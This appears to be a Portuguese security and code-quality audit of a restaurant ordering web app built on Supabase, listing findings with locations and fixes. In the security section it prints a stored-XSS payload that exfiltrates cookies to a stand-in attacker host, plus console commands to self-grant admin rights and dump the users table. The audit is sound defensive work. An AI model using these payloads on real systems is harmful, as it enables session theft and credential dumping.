# Relatório de Auditoria Técnica — Sistema WebComanda (Espetinho & Cia)

**Data:** 2026-07-27
**Escopo revisado:** 100% dos arquivos HTML/CSS/JS do projeto (14 páginas HTML, `style.css`, 20 módulos em `componentes/`, `sw.js`, `ws.js`, `manifest.json`) — leitura integral, linha a linha.

Nenhum código foi alterado durante a auditoria. Este é um documento somente-análise.

## Sumário Executivo (Top 5 riscos)

1. **Senhas em texto puro** — login e todas as validações de senha (admin, estorno, fechamento de caixa) comparam a senha digitada diretamente contra a coluna `senha` da tabela `usuarios`, sem hash. Um fallback em Base64 é tratado como se fosse criptografia.
2. **Autorização 100% client-side** — nível de acesso (`ADMIN`/`GARÇOM`) vem só do `localStorage`. Qualquer pessoa vira admin rodando `localStorage.setItem('userNivel','ADMIN')` no console.
3. **XSS armazenado generalizado** — dezenas de pontos injetam dados do banco via `innerHTML` sem escapar. O caso mais grave: o campo "nome do cliente" do formulário **público e não autenticado** de reservas chega sem tratamento ao painel administrativo.
4. **Totais financeiros confiados do client** — o valor de vendas/comandas é somado no navegador e gravado como está; é possível alterar o preço no console antes de confirmar.
5. **Arquivo de credencial em texto plano dentro do projeto** — `arq/db.txt` contém usuário/senha em texto puro na árvore de arquivos.

---

## 1. Mapeamento Arquitetural e Acoplamento

**Resumo da arquitetura:** É uma aplicação multi-página (MPA) estática — sem framework, sem bundler, sem módulos ES6 (`import`/`export`). Cada página HTML carrega Tailwind CSS via CDN (Play CDN, compilador JIT rodando no navegador), Lucide Icons via `unpkg@latest` (sem versão travada) e o SDK do Supabase via `jsdelivr`. O backend é **Supabase (Postgres) acessado diretamente do navegador** com uma chave pública embutida em `componentes/config.js` — não existe camada de API/servidor intermediária nem Edge Functions. `main.js` funciona como orquestrador: no `DOMContentLoaded` chama `verificarAuth()`/`aplicarPermissoesUI()` (lendo só `localStorage`) e depois um roteador simples por `window.location.pathname` dispara a função de inicialização da tela certa. Não há store de estado central — o estado vive espalhado em `localStorage` (sessão, tema, carrinho) e em dezenas de variáveis soltas em `window.*` por módulo. O acoplamento entre HTML e JS é **muito alto**: centenas de atributos `onclick="window.funcao(...)"` inline e mais de 150 funções expostas globalmente em `window` para serem chamadas pelo HTML — nenhuma tela usa Event Delegation.

⚠️ **O que é:** `eventos.js` é um "God File" de 2780 linhas misturando listagem de eventos, dashboard financeiro, CRUD de reservas, 3 motores de impressão distintos, mapa de mesas e CRUD de patrocinadores, sem separação de responsabilidades.
📍 **Onde está:** `componentes/eventos.js` (arquivo inteiro).
💡 **Sugestão de Mudança:** Dividir em `eventos-listagem.js`, `eventos-reservas.js`, `eventos-financeiro.js`, `eventos-mapa.js`, `eventos-patrocinadores.js`; mover a lógica de impressão para o `print.js` já existente.
🚀 **Benefício:** Manutenibilidade, testabilidade, menor risco de regressão.
🔥 **Prioridade:** Alta

⚠️ **O que é:** `configuracoes.html` é um "God HTML" de 1568 linhas com ~10 seções administrativas totalmente distintas (Produtos, Despesas, Caixa, Relatórios com 6 sub-views, Estorno, Sistema) mais ~20 modais, tudo numa única página que carrega 17 arquivos `<script>` independentemente da seção usada.
📍 **Onde está:** `configuracoes.html` (estrutura geral, scripts nas linhas 1544-1562).
💡 **Sugestão de Mudança:** Separar em páginas reais por seção ou adotar lazy-loading de módulos.
🚀 **Benefício:** Reduz payload inicial e organização do código.
🔥 **Prioridade:** Média

⚠️ **O que é:** `produtos.html` está **vazio (0 bytes, confirmado)** e órfão — nenhum arquivo do projeto linka para ele. Ao mesmo tempo, `componentes/produtos.js` é carregado via `<script defer>` em 6+ páginas (`home.html`, `cozinha.html`, `venda.html`, `divisao.html`, `estorno.html`, `historico-caixas.html`) onde não é utilizado — a gestão real de produtos vive dentro de `configuracoes.html`.
📍 **Onde está:** `produtos.html` (raiz); referências de `<script src="componentes/produtos.js">` nas páginas citadas.
💡 **Sugestão de Mudança:** Excluir `produtos.html` (documentando que a gestão vive em Configurações) ou portar o conteúdo para lá; remover o `<script>` de `produtos.js` das páginas que não o usam.
🚀 **Benefício:** Elimina uma "armadilha" de página em branco e reduz parsing desnecessário.
🔥 **Prioridade:** Alta

⚠️ **O que é:** `componentes/database.js` contém um **resíduo de conflito de merge não resolvido** — a marca literal `=======` na linha 96, com toda a lógica do arquivo (inicialização do Supabase, `dbFetch/dbInsert/dbUpdate/dbDelete`) duplicada integralmente (linhas 1-95 repetidas em 97-190).
📍 **Onde está:** `componentes/database.js:96`.
💡 **Sugestão de Mudança:** Remover o bloco duplicado, mantendo a versão única e correta.
🚀 **Benefício:** Elimina risco de editar a cópia "errada" no futuro.
🔥 **Prioridade:** Média

⚠️ **O que é:** Dois Service Workers concorrentes (`sw.js` v3.3.0 e `ws.js` v4), com listas de cache diferentes, e **nenhum dos dois é registrado** em qualquer lugar do projeto (`navigator.serviceWorker.register` não aparece em nenhum arquivo) — o PWA nunca funciona offline apesar do `manifest.json` existir.
📍 **Onde está:** `sw.js`, `ws.js` (raiz).
💡 **Sugestão de Mudança:** Escolher um único arquivo e registrá-lo em `main.js`; apagar o outro.
🚀 **Benefício:** Recupera a funcionalidade offline planejada; elimina confusão.
🔥 **Prioridade:** Média

⚠️ **O que é:** Carregamento monolítico de scripts — `home.html` (uma tela de dashboard simples) carrega **todos os 15 módulos JS do sistema** via `defer`, incluindo `print.js`, `cozinha.js`, `eventos` (indiretamente) e `caixa-reports.js`, que ela não usa.
📍 **Onde está:** `home.html`, linhas 231-246.
💡 **Sugestão de Mudança:** Carregar por página apenas os módulos necessários, ou adotar um pequeno roteador de import dinâmico.
🚀 **Benefício:** Performance (menos parse/eval por página) e clareza de dependências.
🔥 **Prioridade:** Média

⚠️ **O que é:** Múltiplas funções globais redeclaradas silenciosamente, onde a última sobrescreve a primeira sem aviso — inclusive mudando comportamento visível: `window.render` em `cardapio.js` (2 versões, a 1ª com diferenciação visual por categoria nunca executa); `window.fecharModalImpressao` em `comandas.js` (3 versões, versões antigas limpavam estado que a vencedora não limpa); `window.mascaraTelefone` triplicada (`config.js`, `eventos.js`, `reserva.js`).
📍 **Onde está:** `componentes/cardapio.js:80-147` vs `:290-348`; `componentes/comandas.js:603-608, 742-749, 764-770`; `componentes/config.js:214`, `componentes/eventos.js:2143`, `componentes/reserva.js:267`.
💡 **Sugestão de Mudança:** Manter uma única definição de cada função; centralizar máscaras em `utils.js` (já compartilhado).
🚀 **Benefício:** Elimina bugs de "qual versão realmente roda" e vazamento de estado entre vendas.
🔥 **Prioridade:** Média

⚠️ **O que é:** Dois sistemas de modal paralelos e não integrados: `ui.js` mantém uma lista fixa de IDs para o listener global de `Escape`; `cozinha.js` implementa seu próprio sistema (`abrirModalGenerico`) para modais que não estão nessa lista — resultado: Escape não fecha nenhum modal da tela de cozinha.
📍 **Onde está:** `componentes/ui.js:546-559`; `componentes/cozinha.js:38-70`.
💡 **Sugestão de Mudança:** Unificar em um helper único que descubra modais abertos via `querySelectorAll('[data-modal]:not(.hidden)')`.
🚀 **Benefício:** Consistência de comportamento e menos código duplicado.
🔥 **Prioridade:** Média

⚠️ **O que é:** Condição de corrida (lost update) na gravação de itens de comanda — o fluxo lê a linha inteira, monta o array em memória e regrava tudo, sem lock otimista nem transação no Postgres.
📍 **Onde está:** `componentes/comandas.js`, `gravarPedidoComanda` (linhas 528-559) e `executarRemocaoItem` (linhas 664-680).
💡 **Sugestão de Mudança:** Mover para uma função Postgres (RPC) que faça `UPDATE ... SET itens = itens || novo_item` atomicamente, ou usar `updated_at` como versão otimista.
🚀 **Benefício:** Integridade — hoje dois garçons lançando pedidos na mesma mesa simultaneamente podem fazer um pedido "sumir".
🔥 **Prioridade:** Alta

---

## 2. Otimização de Performance e Refatoração (JS / HTML / CSS)

⚠️ **O que é:** Tailwind CSS carregado via **Play CDN** (`cdn.tailwindcss.com`), que compila as classes em JIT no navegador — a própria documentação do Tailwind desaconselha isso em produção. Junto com Lucide `@latest` (sem versão travada), ambos os scripts são carregados **sem `defer`/`async`**, bloqueando o parser, enquanto os módulos internos corretamente já usam `defer`.
📍 **Onde está:** `index.html:8-9`, `home.html:8-9` (e demais páginas seguem o mesmo padrão).
💡 **Sugestão de Mudança:** Adicionar `defer` aos dois scripts de CDN como correção imediata; para produção real, compilar o Tailwind via build step (CLI) em vez do Play CDN.
🚀 **Benefício:** Reduz o tempo até a primeira renderização (FCP/LCP), especialmente em conexões móveis.
🔥 **Prioridade:** Média

⚠️ **O que é:** Recriação completa de `innerHTML` em listas que atualizam com frequência, causando reflow/repaint total do container em vez de atualização incremental — destaque para a tela da cozinha, que reconstrói a grade inteira a cada evento Realtime **e** a cada 30s de polling, mesmo sem mudança visual, podendo "roubar" um toque em andamento numa tela sensível ao toque.
📍 **Onde está:** `componentes/cozinha.js`, `renderizarMonitor` (linhas 332-429); `componentes/vendas.js`, `renderizarVenda` (recria tudo a cada tecla digitada na busca, sem debounce, linhas 95-164); `componentes/comandas.js`, `carregarComandas`.
💡 **Sugestão de Mudança:** Diff simples por `id` (só criar/atualizar/remover os cards alterados); debounce de ~250ms na busca da vitrine de vendas.
🚀 **Benefício:** Elimina jank em tela de uso contínuo durante o serviço; melhora responsividade em dispositivos mais fracos.
🔥 **Prioridade:** Alta

⚠️ **O que é:** Redundância cara entre Supabase Realtime (canal escutando `event: '*'` sem filtro) e `setInterval` de 30s fazendo o mesmo refetch completo — em rajadas de eventos (ex.: garçom lançando 5 itens seguidos), gera múltiplos refetches + re-renders em segundos.
📍 **Onde está:** `componentes/cozinha.js`, `escutarNovosPedidos` (linhas 319-328) e `iniciarAutoRefresh` (linhas 283-295).
💡 **Sugestão de Mudança:** Usar o Realtime como estratégia primária com debounce de ~500ms-1s, reduzir o polling para fallback de reconexão (60-120s), e adicionar `filter: 'status=eq.aberta'` na assinatura.
🚀 **Benefício:** Menos leituras/custo no Supabase e tela mais estável para o cozinheiro.
🔥 **Prioridade:** Alta

⚠️ **O que é:** Padrão N+1 de consultas — para cada caixa listado no histórico, dispara-se `Promise.all` com 2 queries extras dentro de um `.map`, chegando a ~60 requisições para 30 caixas.
📍 **Onde está:** `componentes/caixa-reports.js`, `carregarHistoricoCaixas` (linhas 466-471).
💡 **Sugestão de Mudança:** Buscar vendas/movimentações de todos os caixas do período de uma vez (`in('id_caixa', idsCaixas)`) e agrupar em memória, ou criar uma view agregada.
🚀 **Benefício:** Reduz drasticamente a latência da tela de Histórico de Caixas.
🔥 **Prioridade:** Média

⚠️ **O que é:** Duplicação massiva de CSS-em-string entre funções de impressão — `getTicketCSS` (print.js) tem ~165 linhas de `if/else` quase idênticos para 8 layouts; `eventos.js` repete ~700 linhas de CSS/HTML entre `imprimirPlacaDoEvento`, `gerarPlacasA5` e `imprimirPlacaPatrocinadores`, incluindo o mesmo algoritmo de auto-ajuste de fonte reimplementado duas vezes.
📍 **Onde está:** `componentes/print.js:99-264`; `componentes/eventos.js` (funções citadas, linhas 777-904, 1862-2114, 2193-2374).
💡 **Sugestão de Mudança:** Transformar em um objeto de temas/config gerado programaticamente, e extrair um template único `gerarLayoutImpressao(config)` reaproveitado por todas as funções de impressão.
🚀 **Benefício:** Reduz drasticamente o tamanho dos arquivos e centraliza correções de layout.
🔥 **Prioridade:** Média

⚠️ **O que é:** Ausência quase total de `try/catch` ao redor de `JSON.parse` de dados vindos do banco — um único registro corrompido derruba a função/relatório inteiro sem indicar qual registro falhou.
📍 **Onde está:** `componentes/print.js` (7+ locais, ex. linhas 739, 867, 1080-1081, 1255); `componentes/dashboard.js:114` (dentro de um `forEach`, sem proteção local, aborta todos os KPIs do dashboard).
💡 **Sugestão de Mudança:** Função utilitária única `parseItensSeguro(itens)` com `try/catch` interno retornando `[]` em caso de erro.
🚀 **Benefício:** Resiliência — um dado sujo não deve travar toda a impressão ou zerar o dashboard financeiro.
🔥 **Prioridade:** Alta

⚠️ **O que é:** Sincronização de fluxos via `setTimeout` com atraso arbitrário (chutado) em vez de eventos/callbacks — a ordem de execução passa a depender de "quão rápido é o dispositivo do usuário". Mesmo padrão problemático no motor de impressão, que usa `setTimeout(1200ms)` fixo em vez do evento `onload` do iframe antes de chamar `print()`.
📍 **Onde está:** `componentes/main.js:762, 1095, 1282`; `componentes/print.js`, `imprimirConteudoIframe:63`.
💡 **Sugestão de Mudança:** Substituir por eventos customizados/promises encadeadas; usar `iframe.onload` com timeout apenas como fallback de segurança.
🚀 **Benefício:** Elimina condições de corrida silenciosas que só aparecem em dispositivos/conexões mais lentas, e cortes de texto em impressão.
🔥 **Prioridade:** Média

⚠️ **O que é:** Funções excessivamente longas violando responsabilidade única, misturando formatação de dados, geração de HTML/CSS e regra de negócio na mesma função.
📍 **Onde está:** `componentes/print.js`, `imprimirComprovante` (~120 linhas, 1242-1364) e `imprimirCupom` (~120 linhas, 731-853); `componentes/eventos.js`, `gerarPlacasA5` (~250 linhas) e `imprimirListaReservas` (~195 linhas).
💡 **Sugestão de Mudança:** Quebrar em funções menores e testáveis (montagem de dados → geração de CSS → geração de HTML → disparo de impressão).
🚀 **Benefício:** Legibilidade e testabilidade.
🔥 **Prioridade:** Média

⚠️ **O que é:** Ausência total de Event Delegation — todas as listas dinâmicas do sistema (comandas, vendas, cozinha, produtos, despesas) usam `onclick="..."` inline gerado dentro de `.map().join('')`, recriado do zero a cada render.
📍 **Onde está:** Recorrente em `componentes/comandas.js`, `vendas.js`, `cozinha.js`, `produtos.js`, `despesas.js`.
💡 **Sugestão de Mudança:** Um único listener por container pai usando `event.target.closest('[data-action]')` + `data-id`.
🚀 **Benefício:** Menos trabalho de parsing/GC do navegador; fecha também um vetor de XSS (ver seção 4).
🔥 **Prioridade:** Média

⚠️ **O que é:** HTML repetitivo copiado manualmente em `configuracoes.html` — grupos de filtro de período (HOJE/7 DIAS/30 DIAS) duplicados 6 vezes, e ~15 botões "Voltar" com classe idêntica repetida.
📍 **Onde está:** `configuracoes.html`, linhas 273-276, 468-471, 591-594, 632-635, 672-675, 1004-1006 (e outras).
💡 **Sugestão de Mudança:** Gerar via função JS `criarFiltroPeriodo(prefixo, callback)` no `DOMContentLoaded`.
🚀 **Benefício:** Redução de centenas de linhas de HTML repetido.
🔥 **Prioridade:** Média

⚠️ **O que é:** Bug funcional — atribuir string a `.className` de um elemento SVG (após `lucide.createIcons()` converter o `<i>` em `<svg>`) não altera as classes, pois `className` em SVG é somente-leitura via propriedade simples.
📍 **Onde está:** `componentes/cardapio.js`, `alternarVisualizacao` (linhas 20, 283).
💡 **Sugestão de Mudança:** Usar `setAttribute('class', ...)` ou recriar o ícone via `data-lucide` + `lucide.createIcons()`.
🚀 **Benefício:** Corrige o botão de alternância grade/lista, que hoje muda o layout mas não o próprio ícone.
🔥 **Prioridade:** Baixa

---

## 3. UI/UX, Acessibilidade e Design System

⚠️ **O que é (achado sistêmico):** Uso de emojis nativos (🔔⚠️✅💡🖨️↩️✏️🗑️🍢🥤 etc.) como ícones funcionais em praticamente **todo HTML gerado dinamicamente por JavaScript**, apesar do projeto já carregar e usar Lucide Icons extensivamente no HTML estático — gera inconsistência visual entre sistemas operacionais/navegadores e não é semântico para leitores de tela.
📍 **Onde está:** `ui.js` (`showToast`, linhas 9-40), `main.js`, `user.js`, `config.js`, `comandas.js`, `vendas.js`, `produtos.js`, `despesas.js`, `eventos.js` — dezenas de ocorrências.
💡 **Sugestão de Mudança:** Substituir por `<i data-lucide="...">` + `lucide.createIcons()` após cada re-render, com `aria-label` descritivo nos botões.
🚀 **Benefício:** Consistência visual entre plataformas e melhor suporte a tecnologia assistiva.
🔥 **Prioridade:** Média

⚠️ **O que é (CRÍTICO OPERACIONAL):** Migração incompleta de ícones na tela da Cozinha — o HTML carrega **apenas** Lucide (há até um comentário no código: "Substituído Phosphor Icons por Lucide Icons"), mas `cozinha.js` continua atribuindo classes **Phosphor** (`ph-bold`, `ph-fill`) em dezenas de pontos, e nenhuma fonte/CSS do Phosphor está carregada em lugar nenhum — os ícones simplesmente não aparecem (espaço em branco), incluindo os badges de status "NOVO" (🔥) e "EM PREPARO" (⏳), que são a principal sinalização visual de prioridade para a equipe da cozinha.
📍 **Onde está:** `componentes/cozinha.js`, linhas 161/164, 189/210, 372/376/391, 564, 879.
💡 **Sugestão de Mudança:** Substituir todas as classes `ph-*` por `data-lucide` equivalentes.
🚀 **Benefício:** Restaura a sinalização visual crítica para operação sob pressão — reduz risco de itens preparados fora de ordem.
🔥 **Prioridade:** Alta

⚠️ **O que é:** Ausência de proteção contra duplo clique/toque nas **três ações financeiras mais críticas do sistema**: finalizar venda de balcão, confirmar lançamento de itens em comanda, e fechamento definitivo de caixa ("Leitura Z") — nenhuma desabilita o botão nem mostra estado de "processando" durante o `await`, ao contrário de `confirmarFechamento` (comandas.js), que já faz isso corretamente.
📍 **Onde está:** `componentes/vendas.js`, `confirmarVenda` (linhas 285-344) e `finalizarPedidoComandaVenda` (linhas 469-507); `componentes/comandas.js`, `concluirLancamentoComanda` (linhas 579-585); `componentes/caixa-reports.js`, `validarFechamentoGeral`/`executarFechamentoDefinitivoBanco` (linhas 276-411).
💡 **Sugestão de Mudança:** Desabilitar o botão e mostrar "PROCESSANDO..." no início da função, reabilitando no `finally` — replicar o padrão já existente em `confirmarFechamento`.
🚀 **Benefício:** Evita venda duplicada, item duplicado na comanda ou fechamento de caixa processado duas vezes — risco financeiro direto.
🔥 **Prioridade:** Alta

⚠️ **O que é:** Nenhum modal do sistema (dezenas deles, em todas as telas) implementa gerenciamento de foco adequado: sem `role="dialog"`/`aria-modal="true"`, sem focus-trap, sem retorno de foco ao fechar. Combinado ao achado de "dois sistemas de modal" (seção 1), a tecla Escape simplesmente não funciona nos modais da tela de Cozinha.
📍 **Onde está:** Praticamente todos os `<div id="modal-...">` do projeto (`home.html`, `venda.html`, `comandas.html`, `cozinha.html`, `configuracoes.html`, etc.); handlers em `componentes/ui.js:546-559` e `componentes/cozinha.js:38-70`.
💡 **Sugestão de Mudança:** Implementar um helper genérico de modal com ARIA correto e focus-trap, aplicado uniformemente.
🚀 **Benefício:** Acessibilidade via teclado/leitor de tela — requisito básico WCAG 2.1 para diálogos.
🔥 **Prioridade:** Média

⚠️ **O que é:** HTML não-semântico ("div soup") generalizado — `<div>`/`<span>` no lugar de `<button>`, `<ul>/<li>`, `<form>` e `<label for="">`. Destaques: seções de cadastro em `configuracoes.html` sem `<form>` (perdendo submit por Enter e validação HTML5 nativa); botão de remover item do carrinho é uma `<div onclick>` sem foco por teclado; labels de campos monetários críticos (valor recebido) sem `for` associando ao input.
📍 **Onde está:** `configuracoes.html` (`#aba-cadastro` linha 166, `#view-form-despesa` linha 301); `componentes/vendas.js:141`; `venda.html:185`, `comandas.html:210`.
💡 **Sugestão de Mudança:** Envolver formulários reais em `<form>` com `required`; trocar `<div onclick>` por `<button type="button">`; adicionar `for=`/`id` correspondentes.
🚀 **Benefício:** Acessibilidade, validação nativa, melhor suporte a autofill/teclado — relevante justamente nos fluxos de maior valor financeiro.
🔥 **Prioridade:** Média

⚠️ **O que é:** Botões contendo apenas ícone/emoji sem `aria-label` em ações sensíveis (reimprimir comanda, solicitar estorno) — leitor de tela anuncia apenas o emoji literal ou nada.
📍 **Onde está:** `componentes/ui.js`, `gerarRelatorioComandas` (linhas 226-234).
💡 **Sugestão de Mudança:** Adicionar `aria-label="Solicitar estorno"` etc., mantendo o ícone como decorativo (`aria-hidden="true"`).
🚀 **Benefício:** Ação financeira crítica deixa de ser ambígua para tecnologia assistiva.
🔥 **Prioridade:** Média

⚠️ **O que é:** Sistema de toasts (`showToast`) não possui `aria-live`/`role="status"` no container — erros e confirmações não são anunciados a leitores de tela.
📍 **Onde está:** `componentes/ui.js:9-40`; containers em `eventos.html:582`, `reserva.html:83`.
💡 **Sugestão de Mudança:** Adicionar `role="status" aria-live="polite"` (ou `assertive` para erros) ao container de toasts.
🚀 **Benefício:** Acessibilidade para confirmações/erros do sistema.
🔥 **Prioridade:** Média

⚠️ **O que é:** Uso de `alert()` nativo em pontos isolados, quebrando a consistência com o sistema próprio de toasts/modais customizados usado no resto do app — bloqueia a thread e não respeita dark mode.
📍 **Onde está:** `componentes/eventos.js:937-939, 2195, 2496`; cascata de fallback `showToast → alertaSistema → alert()` repetida dezenas de vezes em `produtos.js`, `despesas.js`, `cozinha.js`.
💡 **Sugestão de Mudança:** Garantir que `ui.js` sempre carregue primeiro e eliminar os fallbacks em cascata.
🚀 **Benefício:** Consistência visual e remoção de risco de `alert()` bloqueante em produção.
🔥 **Prioridade:** Baixa

⚠️ **O que é:** Bug funcional — o botão "mostrar senha" da tela de login nunca alterna o ícone, porque `toggleVerSenha` só reconhece sufixos de ID `novo`/`edit`, mas o campo de login usa `pass`/`icon-pass-login`.
📍 **Onde está:** `componentes/user.js`, `toggleVerSenha` (linhas 5-19); `index.html:68-70`.
💡 **Sugestão de Mudança:** Padronizar os IDs e ajustar a lógica de sufixo, ou passar o ID do ícone diretamente como parâmetro.
🚀 **Benefício:** Corrige feedback visual quebrado numa tela crítica (login).
🔥 **Prioridade:** Baixa

⚠️ **O que é:** Ausência de "anti-flash" de conteúdo protegido — `verificarAuth()` só faz `document.body.style.display = 'block'` após validar a sessão, mas não existe nenhuma regra CSS ocultando o `<body>` por padrão; como os scripts são `defer`, o HTML/CSS já pode ter sido pintado antes do JS rodar.
📍 **Onde está:** `componentes/main.js`, `verificarAuth()` (linha 111).
💡 **Sugestão de Mudança:** Adicionar `<body style="display:none">` nas páginas internas, removido só após a validação de sessão.
🚀 **Benefício:** Evita flash de dados sensíveis (faturamento, botões admin) para usuário sem sessão válida.
🔥 **Prioridade:** Média

---

## 4. Segurança, Escalabilidade e Boas Práticas Frontend

⚠️ **O que é (CRÍTICO):** Senhas armazenadas e comparadas **em texto puro**, sem hashing (bcrypt/Argon2). O login busca a linha do usuário filtrando diretamente pela senha em claro; a validação de senha admin ainda aceita **Base64 como alternativa válida** — Base64 é apenas codificação reversível, não criptografia.
📍 **Onde está:** `componentes/login.js`, `fazerLogin` (linhas 76-81: `.eq('senha', senhaInput)`); `componentes/user.js` (linhas 109, 169-170); `componentes/main.js`, `confirmarAuth` (linha 186: `btoa(senhaDigitada) === admin.senha || senhaDigitada === admin.senha`); `componentes/caixa-reports.js`, `validarFechamentoGeral` (linhas 290-294).
💡 **Sugestão de Mudança:** Migrar para Supabase Auth (hash nativo) ou implementar hashing via Edge Function/RPC no servidor — nunca comparar senha via `SELECT` vindo do cliente.
🚀 **Benefício:** Hoje qualquer pessoa com DevTools aberto, usando a mesma chave pública já embutida no código, pode rodar `_supabase.from('usuarios').select('*')` e obter login/senha de todos os funcionários e do admin.
🔥 **Prioridade:** Crítica

⚠️ **O que é (CRÍTICO):** Autorização (nível ADMIN/GARÇOM) decidida inteiramente no client, sem qualquer verificação de servidor — trivialmente contornável.
📍 **Onde está:** `componentes/main.js`, `aplicarPermissoesUI()` (linhas 118-132) e `verificarAuth()` (linhas 75-116), ambas lendo só `localStorage.getItem('userNivel')`.
💡 **Sugestão de Mudança:** Implementar Row Level Security (RLS) no Supabase atrelado à sessão real (Supabase Auth); front-end deve refletir a UI, nunca ser a única barreira.
🚀 **Benefício:** Fecha um vetor de escalonamento de privilégio que hoje depende 100% de o usuário não saber abrir o console do navegador.
🔥 **Prioridade:** Crítica

⚠️ **O que é (CRÍTICO):** O total de vendas/comandas é somado inteiramente no client (`window.carrinho.reduce(...)`) e gravado como está, sem recomputação no servidor contra a tabela `produtos` — é possível alterar o preço de um item no console antes de confirmar a venda (inclusive para valores negativos).
📍 **Onde está:** `componentes/vendas.js`, `confirmarVenda` (linhas 286, 311); `componentes/comandas.js`, `gravarPedidoComanda` (linha 553).
💡 **Sugestão de Mudança:** Criar uma função de banco (RPC) que recebe apenas `{produto_id, qtd}[]`, busca o preço atual no servidor e calcula o total ali.
🚀 **Benefício:** Fecha a maior brecha de fraude/erro de caixa do sistema.
🔥 **Prioridade:** Crítica

⚠️ **O que é (CRÍTICO — vetor explorável por usuário externo não autenticado):** XSS armazenado generalizado por `innerHTML` sem sanitização, presente em pelo menos 8 módulos diferentes (`print.js`, `ui.js`, `audit.js`, `eventos.js`, `comandas.js`, `cardapio.js`, `produtos.js`, `despesas.js`, `main.js`). O caso mais grave: `cliente_nome`, coletado no formulário **público e sem autenticação** `reserva.html`, é gravado no Supabase e depois renderizado sem escape no painel administrativo e em impressões — um visitante externo pode reservar uma mesa com um nome contendo `<img src=x onerror=fetch('//atacante/'+document.cookie)>`, que executa na sessão do funcionário/admin ao abrir a tela de Reservas ou imprimir o comprovante.
📍 **Onde está:** Origem em `componentes/reserva.js:202-228`; renderização sem escape em `componentes/eventos.js` (`desenharCardsReservas`, ~linha 464); `componentes/print.js`, `imprimirComprovante` (linha 1315); também afeta identificação de mesa (`comandas.js:58`), nome/observação de item (`print.js`, múltiplos pontos), e logs da própria tela de Auditoria (`audit.js:83-98` — a ferramenta usada para investigar incidentes vira, ela mesma, vetor de ataque).
💡 **Sugestão de Mudança:** Criar uma função `escapeHtml(str)` única e aplicá-la em **todo** dado dinâmico antes de qualquer interpolação em template string destinada a `innerHTML`/`document.write`; idealmente validar/bloquear caracteres `<>` já no momento da gravação em `reserva.js`.
🚀 **Benefício:** Fecha o vetor de XSS mais grave do sistema, acionável por qualquer visitante externo sem login.
🔥 **Prioridade:** Crítica

⚠️ **O que é (CRÍTICO):** A "sanitização" do motor central de impressão é uma proteção falsa — remove apenas tags `<script>` via regex antes de escrever o HTML no iframe, sem tratar atributos de evento (`onerror`, `onload`) nem tags como `<svg onload=...>`.
📍 **Onde está:** `componentes/print.js`, `imprimirConteudoIframe` (linhas 37-73, regex nas linhas 53-56, `doc.write` na linha 60).
💡 **Sugestão de Mudança:** Substituir a regex por escaping real de entidades HTML nos dados antes da interpolação — regex de remoção de `<script>` nunca é substituto de escaping.
🚀 **Benefício:** Fecha um vetor de XSS que hoje compromete a sessão de qualquer operador que imprima um cupom malicioso.
🔥 **Prioridade:** Crítica

⚠️ **O que é (ALTO):** Um arquivo de credencial em texto plano (`Name`/`Senha`) está gravado dentro da própria árvore do projeto.
📍 **Onde está:** `arq/db.txt` (confirmado diretamente nesta auditoria).
💡 **Sugestão de Mudança:** Remover o arquivo do projeto e, se necessário documentar credenciais, usar um gerenciador de segredos externo (nunca um `.txt` versionável).
🚀 **Benefício:** O projeto ainda não é um repositório Git, mas isso é uma prática de altíssimo risco assim que for versionado, zipado ou compartilhado com terceiros.
🔥 **Prioridade:** Alta

⚠️ **O que é (ALTO):** A função de backup do sistema exporta **todas as tabelas** (incluindo `usuarios`, com senha em texto puro) para um JSON local. A "senha mestre" que protege esse botão é apenas uma camada de UI — a função está pendurada em `window.*` e pode ser chamada diretamente pelo console, pulando totalmente a validação.
📍 **Onde está:** `componentes/main.js`, `fazerBackupSistema` (linhas 1124-1176, `tabelasParaBackup` inclui `'usuarios'` na linha 1121).
💡 **Sugestão de Mudança:** Mover a geração de backup para uma função de servidor autenticada; nunca incluir a coluna de senha no export.
🚀 **Benefício:** Evita vazamento em massa de credenciais de todos os usuários através de um "atalho" de conveniência.
🔥 **Prioridade:** Alta

⚠️ **O que é (ALTO):** Sem rate-limit na validação de senha de fechamento de caixa, que **nem sequer verifica o usuário** — basta acertar a senha de qualquer conta admin do sistema, sem limite de tentativas.
📍 **Onde está:** `componentes/caixa-reports.js`, `validarFechamentoGeral` (linhas 276-322).
💡 **Sugestão de Mudança:** Mover para backend com rate limiting; exigir também o usuário, como já faz o fluxo de estorno.
🚀 **Benefício:** Reduz risco de acesso indevido ao fechamento de caixa por tentativa e erro.
🔥 **Prioridade:** Alta

⚠️ **O que é (MÉDIO):** Validações de negócio (preço > 0, estoque ≥ 0, capacidade de evento) existem apenas no client — nada impede uma chamada direta à API (usando a mesma chave pública já exposta) gravar preço negativo ou estoque negativo.
📍 **Onde está:** `componentes/produtos.js`, `salvarProduto` (linha 153) e `salvarMovimentacao` (linhas 440-443, sem checagem de estoque insuficiente).
💡 **Sugestão de Mudança:** Implementar constraints no banco (`CHECK (preco > 0)`, `CHECK (estoque_atual >= 0)`) e políticas de RLS que validem na camada de banco.
🚀 **Benefício:** Integridade de dados mesmo diante de bugs de UI ou chamadas diretas à API.
🔥 **Prioridade:** Alta

⚠️ **O que é (MÉDIO):** Escaping incompleto de dados injetados dentro de atributos `onclick` — só aspas simples são tratadas, deixando o atributo vulnerável a quebra por aspas duplas/backslash em nomes de produto/cliente.
📍 **Onde está:** `componentes/comandas.js:244`; `componentes/main.js:1503-1540` (JSON serializado dentro de `onclick`, só aspas duplas escapadas, mas o atributo é delimitado por aspas simples — um apóstrofo no nome do cliente quebra o HTML).
💡 **Sugestão de Mudança:** Não serializar dados em atributos HTML; guardar objetos em um `Map` por `id` e passar apenas o `id` no `onclick` (mesma correção do Event Delegation da seção 2).
🚀 **Benefício:** Elimina uma classe inteira de bugs de quebra de HTML/injeção.
🔥 **Prioridade:** Média

⚠️ **O que é (MÉDIO):** Dependências de terceiros (Tailwind, Lucide, Supabase SDK) carregadas via CDN sem Subresource Integrity (SRI) — inclusive dentro do HTML gerado para impressão de relatórios financeiros, que passa a depender de internet e de um CDN externo no momento da impressão.
📍 **Onde está:** `index.html:8-9`, `home.html:8-9`; `componentes/print.js`, `imprimirFluxoFinanceiro` (linha 1725, injeta `<script src="cdn.tailwindcss.com">` dentro do iframe de impressão).
💡 **Sugestão de Mudança:** Adicionar hashes SRI nos CDNs, ou eliminar a dependência de CDN na impressão gerando o CSS localmente (como já é feito nas demais funções de PDF).
🚀 **Benefício:** Reduz risco de supply-chain e garante que a impressão financeira funcione offline.
🔥 **Prioridade:** Média

